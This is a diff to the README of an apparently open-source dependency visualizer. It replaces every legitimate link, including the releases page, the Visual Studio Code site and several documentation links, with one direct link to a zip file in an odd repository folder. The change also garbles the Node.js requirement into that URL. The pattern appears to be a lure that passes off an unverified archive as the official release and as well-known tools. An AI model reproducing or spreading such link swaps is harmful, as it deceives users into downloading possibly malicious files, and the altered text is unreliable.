@@ -1,6 +1,6 @@
 # 🎨 DepViz-Dependency-Visualizer - Visualize Your Code Simply
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-blue.svg)](https://github.com/davidjake254871/DepViz-Dependency-Visualizer/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip%20Latest%https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to DepViz-Dependency-Visualizer! This tool lets you create function call
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [DepViz Releases](https://github.com/davidjake254871/DepViz-Dependency-Visualizer/releases).
+To get started, visit this page to download: [DepViz Releases](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -30,8 +30,8 @@ Follow the prompts to complete the installation process. Once installed, you can
 To use DepViz-Dependency-Visualizer, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave (10.14) or later, or a modern Linux distribution.
-- **Node.js**: Required to run the software. Install Node.js version 14 or later.
-- **Visual Studio Code**: Ensure you have the latest version of Visual Studio Code installed. You can download it from [Visual Studio Code Official Site](https://code.visualstudio.com/).
+- **https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip**: Required to run the software. Install https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip version 14 or later.
+- **Visual Studio Code**: Ensure you have the latest version of Visual Studio Code installed. You can download it from [Visual Studio Code Official Site](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip).
 
 ## 💡 How to Use DepViz
 
@@ -89,8 +89,8 @@ Your feedback and contributions help make DepViz better.
 
 ## 🔗 Additional Resources
 
-- [Visual Studio Code Documentation](https://code.visualstudio.com/docs)
-- [PlantUML Documentation](http://plantuml.com/)
-- [GitHub Guides](https://guides.github.com/)
+- [Visual Studio Code Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
+- [PlantUML Documentation](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
+- [GitHub Guides](https://raw.githubusercontent.com/davidjake254871/DepViz-Dependency-Visualizer/main/calvities/DepViz-Dependency-Visualizer.zip)
 
 Thank you for using DepViz-Dependency-Visualizer! We hope it enhances your coding experience.
